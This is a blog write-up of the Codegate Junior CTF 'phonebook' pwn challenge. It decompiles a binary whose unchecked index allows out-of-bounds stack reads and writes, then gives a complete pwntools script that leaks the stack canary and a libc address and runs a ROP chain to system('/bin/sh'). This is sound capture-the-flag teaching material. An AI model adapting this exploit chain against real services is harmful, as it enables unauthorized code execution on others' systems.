---
title: "[Codegate Junior Preliminary Quals] phonebook writeup"
published: 2026-04-01
category: CTF
description: Codegate Junior Preliminary
tags: [CTF, writeup, codegate2026]
draft: false
---

# phonebook
Of all the pwn problems, this was the most fun to start with.
Familiar menus, familiar structure feel, it was fun the whole time.

---
## Static analysis

### `main()`
```c
/* WARNING: Unknown calling convention -- yet parameter storage is locked */
int init(EVP_PKEY_CTX *ctx)
{
  int iVar1;
  
  memset(ctx,0,0x300); // 768(10launching)
  setvbuf(stdin,(char *)0x0,2,0); // ctfBuffer settings
  setvbuf(stdout,(char *)0x0,2,0);
  iVar1 = setvbuf(stderr,(char *)0x0,2,0);
  return iVar1;
}

int main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  EVP_PKEY_CTX local_318 [776];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28); // I interpret it as the part where the canary is inserted.
  init(local_318);
  do {
    puts("\n=== phonebook ===");
    puts("1. create");
    puts("2. edit");
    puts("3. list");
    puts("4. delete");
    puts("5. exit");
    printf("> ");
    iVar1 = read_int();
    if (iVar1 == 1) {
      create(local_318);
    }
    if (iVar1 == 2) {
      edit(local_318);
    }
    if (iVar1 == 3) {
      list(local_318);
    }
    if (iVar1 == 4) {
      delete(local_318);
    }
  } while (iVar1!= 5);
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

---
### `EVP_PKEY_CTX`?
The first question that came to mind was what on earth is this structure? It was.
I searched and found that the code is based on C language.

> In the OpenSSL library, “Context (Status/Information)” structure to control and configure the operation of the public key algorithm (Public Key Algorithm)

They say that...

The contents of the `do while` statement are just

Show the menu, receive input, return to the case, and that is it.

Let’s analyze each function.

---
### `read_int()`

```c
void read_int(void)
{
  long in_FS_OFFSET;
  char local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  read_line(local_28,0x10);
  atoi(local_28);
  if (local_10!= *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
Internally calls `read_line()`.
After reading as much as `0x10` like this, convert it to an integer, and that is it.

---
### `read_line()`

```c
void read_line(char *param_1,int param_2)
{
  size_t sVar1;
  
  read(0,param_1,(long)param_2);
  sVar1 = strcspn(param_1,"\n");
  param_1[sVar1] = '\0';
  return;
}
```

Here, `read()` is also called internally to read the specified size.
Terminate the point where a newline character appears with a null byte.

---
### `create()`

```c
void create(long param_1)
{
  int iVar1;
  printf("index: ");
  iVar1 = read_int();
  printf("firstName: ");
  read_line(param_1 + (long)iVar1 * 0x60 + 0x40,0x20); // structure-like layout
  printf("lastName: ");
  read_line(param_1 + (long)iVar1 * 0x60 + 0x20,0x20);
  printf("phoneNumber: ");
  read_line(param_1 + (long)iVar1 * 0x60,0x20);
  return;
}
```
Here, write the value to be inserted into the random structure variable index.
The structure size is `0x60`,

The first member is `phoneNumber`,
The second member is `lastName`,
The last member is `firstName`.
Each has a size of `0x20`.

But there is no restriction on `i` lol.
**OOB** It seems possible.

---
### `edit()`

```c
void edit(long param_1)
{
  int iVar1;
  
  printf("index: ");
  iVar1 = read_int();
  printf("firstName: ");
  read_line(param_1 + (long)iVar1 * 0x60 + 0x40,0x20);
  printf("lastName: ");
  read_line(param_1 + (long)iVar1 * 0x60 + 0x20,0x20);
  printf("phoneNumber: ");
  read_line(param_1 + (long)iVar1 * 0x60,0x20);
  return;
}
```

`edit` is structurally similar to `create`, so it exposes the same vulnerability.

---
### `list()`
```c
void list(long param_1)
{
  uint local_c;
  
  for (local_c = 0; (int)local_c < 8; local_c = local_c + 1) {
    if (*(char *)(param_1 + (long)(int)local_c * 0x60 + 0x40)!= '\0') {
      printf("[%d] %s %s / %s\n",(ulong)local_c,param_1 + (long)(int)local_c * 0x60 + 0x40,
             param_1 + (long)(int)local_c * 0x60 + 0x20,param_1 + (long)(int)local_c * 0x60);
    }
  }
  return;
}
```

It goes through each structure variable index and, if `firstName` is not empty, all values ​​of the variable are output.
`%s` << This is a bit unusual. It can be used for **random reading** because it is output without performing a null termination check.

---
### `delete()`

```c
void delete(long param_1)
{
  int iVar1;
  
  printf("index: ");
  iVar1 = read_int();
  memset((void *)(param_1 + (long)iVar1 * 0x60),0,0x60);
  return;
}
```

Delete the value at the desired index.

---
## Static Analysis--2
Since we have only glanced at the code, let's take a look at the assembly and take note of where it is stored on the stack.

```asm
0010165f f3 0f 1e fa     ENDBR64
00101663 55              PUSH       RBP
00101664 48 89 e5        MOV        RBP,RSP
00101667 48 81 ec        SUB        RSP,0x320
20 03 00 00
0010166e 64 48 8b        MOV        RAX,qword ptr FS:[0x28]
04 25 28 
00 00 00
00101677 48 89 45 f8     MOV        qword ptr [RBP + local_10],RAX
0010167b 31 c0           XOR        EAX,EAX
0010167d 48 8d 85        LEA        RAX=>local_318,[RBP + -0x310]
f0 fc ff ff
```
The starting offset is `RBP-0x310`.

So let’s see how far we can read with **OOB**,
As we saw earlier in `list()`, 7 is the maximum.
If you start from 8

`struct8 = ($rbp - 0x310) + 8 * 0x60 = ($rbp - 0x10)`
Since the starting point is ($rbp-0x10), the first member

- `phoneNumber` is `($rbp-0x10) ~ ($rbp+0x0f)`
- `lastName` is `($rbp+0x10) ~ ($rbp+0x2f)`
- `firstName` is `($rbp+0x30) ~ ($rbp+0x3f)`

**thus!**
- `canary` is located in `$rbp-0x8`.
- `saved return address` is located in `$rbp+0x8`.
In other words, both Canary/RET can be leaked in the 8th structure, and `saved rbp` can also be leaked.
Besides, writing
it is possible up to `$rbp+0x3f`, so it is a breeze.

---
## EXPLOIT!!!

The plan has been made. Let's start with Canary.

We can read **until the 7th idx**, but we **fill the size of 0x20 without including the newline**

<a href="https://ibb.co/20w2ZTqc"><img src="https://i.ibb.co/20w2ZTqc/Screenshot-2026-04-01-at-12-04-42-PM.png" alt="Screenshot-2026-04-01-at-12-04-42-PM" border="0"></a>

Then, when reading, it is possible to leak up to the 8th (canary/sfp/ret) structure after 7!

Since we are currently looking for Canary, we make it 8 times and only add 9 b'A's (in phoneNumber).
Then a canary will be printed, and you just have to pull it out.
It was a bit difficult to pull off. Well, it is just a matter of formatting it...

In Canary, the lowest 1 byte is null, so this must also be covered.
that is how I'll pick `main`'s **SFP**!

But it is not really useful.
I could just cover ret addr later, but why...

So, I will pick `saved ret addr`** of **`main`~~

---

## REAL EXPLOIT!!

```py
cat ex.py 
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.binary = elf = ELF('./prob')
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

#HOST, PORT = "host3.dreamhack.games 8296".split()
HOST, PORT = 'localhost 33687'.split()

RET_OFF = 0x2A1CA
RET_G   = 0x2882F
POP_RDI = 0x10F75B
BINSH   = 0x1CB42F
SYSTEM  = 0x58740
EXIT    = 0x47B90

# ================= IO =================
s       = lambda data               : p.send(data)
sa      = lambda delim, data        : p.sendafter(delim, data)
sl      = lambda data               : p.sendline(data)
sla     = lambda delim, data        : p.sendlineafter(delim, data)
r       = lambda num=4096           : p.recv(num)
rl      = lambda                    : p.recvline()
ru      = lambda delim, drop=True   : p.recvuntil(delim, drop)
uu64    = lambda data               : u64(data.ljust(8, b'\x00'))

# ================= CONNECT =================
p = remote(HOST, int(PORT))
libc = ELF('./libc.so.6')

# ================= FUNC =================
def choose(choice):
    sl(str(choice).encode())

def create(idx, first, last=b"\n", phone=b"\n"):
    choose(1)
    sla(b"index: ", str(idx).encode())
    sa(b"firstName: ", first)
    sa(b"lastName: ", last)
    sa(b"phoneNumber: ", phone)
    ru(b"> ")

def edit_phone(payload):
    choose(2)
    sla(b"index: ", b"8")
    sa(b"firstName: ", b"\n")
    sa(b"lastName: ", b"\n")
    sa(b"phoneNumber: ", payload)
    ru(b"> ")

def edit_full(last, phone):
    choose(2)
    sla(b"index: ", b"8")
    sa(b"firstName: ", b"\n")
    sa(b"lastName: ", last)
    sa(b"phoneNumber: ", phone)
    ru(b"> ")

def do_list():
    choose(3)
    return ru(b"> ")

# ================= EXPLOIT =================
def exploit():
    # 1. create
    create(7, b"F" * 32)

    # 2. canary leak
    edit_phone(b"G" * 9)
    out = do_list()
    line = out.split(b"\n")[0]

    marker = b"F" * 32 + b"G" * 9
    idx = line.index(marker) + len(marker)

    canary = b"\x00" + line[idx:].split(b"  / ")[0][:7]
    log.info(f"canary = {canary.hex()}")

    # 3. ret leak
    payload = b"H" * 8 + b"I" + canary[1:] + b"J" * 8
    edit_phone(payload)

    out = do_list()
    line = out.split(b"\n")[0]

    marker = b"F" * 32 + payload
    idx = line.index(marker) + len(marker)

    ret_leak = line[idx:].split(b"  / ")[0][:6]
    ret_addr = uu64(ret_leak)

    libc_base = ret_addr - RET_OFF

    log.info(f"ret = {ret_addr:#x}")
    log.info(f"libc = {libc_base:#x}")

    # 4. ROP
    last = (
        p64(libc_base + POP_RDI)
        + p64(libc_base + BINSH)
        + p64(libc_base + SYSTEM)
        + p64(libc_base + EXIT)
    )

    phone = b"P" * 8 + canary + p64(1) + p64(libc_base + RET_G)

    edit_full(last, phone)

    # 5. trigger
    choose(5)

# ================= RUN =================
if __name__ == "__main__":
    exploit()
    p.interactive()
```

At the time of writing the review, the server was closed, so I launched Docker locally and wrote the review again.
I was not really satisfied with the skeleton code, so I had a trustworthy colleague help me reformat it.
